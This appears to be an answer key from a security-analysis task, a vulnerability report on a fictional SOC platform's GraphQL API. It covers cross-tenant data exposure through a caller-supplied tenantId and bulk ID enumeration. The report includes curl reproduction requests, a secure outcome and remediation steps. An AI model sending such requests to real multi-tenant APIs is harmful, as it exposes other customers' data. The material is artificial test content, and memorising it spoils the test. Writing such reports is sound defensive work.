# Expected Response

## System
- Domain: Cybersecurity / SIEM
- System: ThreatLens SOC Platform
- Example ID: GQL-0033

## Priority Findings

### Finding 1: GraphQL Cross-Tenant Data Exposure via Attacker-Supplied tenantId Filter (Pattern 2.2 — Metadata/Attribute Side-Channel)
**Severity:** Critical
**Category:** Broken Access Control / BAC

**Summary:**
The `listResources` query on `POST /graphql` accepts a `tenantId` argument supplied directly in the query body. An authenticated user from `tenant-957c` can pass `tenantId: "tenant-2379"` to enumerate and read records belonging to an entirely different tenant. The server returns full `sensitiveField` and `internalNotes` content, confirming that the JWT's own `tenantId` claim is never enforced as the authoritative tenant filter.

**Evidence from HAR:**
- Request: `POST https://api.threatlens-soc-platf.example.com/graphql` (2026-04-13T16:22:34Z, 183 ms)
- JWT header `x-tenant-id`: `tenant-957c` — attacker's identity
- Query payload: `listResources(tenantId: "tenant-2379") { resourceId ownerId data { sensitiveField } }` — attacker supplies foreign tenantId
- Response HTTP status: `200 OK` — no authorization error raised
- Response body `tenantId`: `tenant-2379` — cross-tenant object returned
- Response `ownerId`: `other-user-957c2379`
- Response `sensitiveField`: `CONFIDENTIAL-957c2379` — confirmed sensitive data leak
- Response `internalNotes`: `Internal data exposed` — internal-only field exposed
- `x-request-id`: `req-957c2379`

**Root Cause:**
The `listResources` resolver accepts the `tenantId` parameter from the caller instead of extracting it exclusively from the validated JWT. Rows from `tenant-2379` are returned with no ownership check. Section 4.0 (RISK-GQL-033) confirms the resolver does not cross-check the object's `tenantId` against the JWT's `tenantId` claim.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-033 | "resolver does NOT verify that fetched object's tenantId matches the JWT's tenantId" |
| context.txt §3.0 | `listResources` schema | Accepts optional `tenantId: ID` filter from caller |
| HAR entry | request.postData | `listResources(tenantId: "tenant-2379")` from `tenant-957c` |
| HAR entry | response.content | `tenantId: "tenant-2379"`, `sensitiveField: "CONFIDENTIAL-957c2379"`, `internalNotes: "Internal data exposed"` |

---

### Finding 2: Cross-Tenant Bulk Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass enumeration

**Summary:**
The `bulkResourceLookup` mutation (§4.0) accepts an arbitrary array of resource IDs without per-ID ownership filtering. An attacker can provide IDs belonging to any tenant and receive their full data in a single response.

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own tenant)
```bash
curl -s -X POST https://api.threatlens-soc-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-957c" \
  -d '{"query": "query { listResources(tenantId: \"tenant-957c\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns resources belonging to `tenant-957c` only.

### Step 2 — Cross-tenant enumeration (primary attack)
```bash
curl -s -X POST https://api.threatlens-soc-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-957c" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-2379\") { resourceId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-2379"`, `ownerId: "other-user-957c2379"`, `sensitiveField: "CONFIDENTIAL-957c2379"`, `internalNotes: "Internal data exposed"` — cross-tenant data disclosure confirmed.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"listResources": null}}`.

### Step 3 — Bulk cross-tenant enumeration
```bash
curl -s -X POST https://api.threatlens-soc-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-957c" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2379-001\", \"R-2379-002\", \"R-2379-003\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns resources from `tenant-2379` without ownership error.
**Secure outcome:** Only resources matching the JWT's `tenantId` (`tenant-957c`) are returned; others return null or FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched resolver MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "listResources": null }
}
```

## Remediation
1. **Ignore caller-supplied `tenantId`:** In `listResources`, extract `tenantId` exclusively from the validated JWT claims — never accept it as a query argument.
2. **Resolver-level tenant guard:** Apply `WHERE tenant_id = $jwt.tenantId` on all resolvers that fetch resources by ID or filter (§4.0 RISK-GQL-033 gap).
3. **Per-ID ownership filter for bulk operations:** In `bulkResourceLookup`, post-filter returned rows to only include records whose `tenant_id` matches the JWT's `tenantId`.
4. **Redis cache key includes tenantId:** Change the cache key from `resourceId` alone to `resourceId:tenantId` to prevent cache-poisoning cross-tenant reads (§2.0 note).
5. **Automated regression tests:** Assert that a `tenant-957c` token calling `listResources(tenantId: "tenant-2379")` receives HTTP 403 or null data — not the foreign tenant's records.
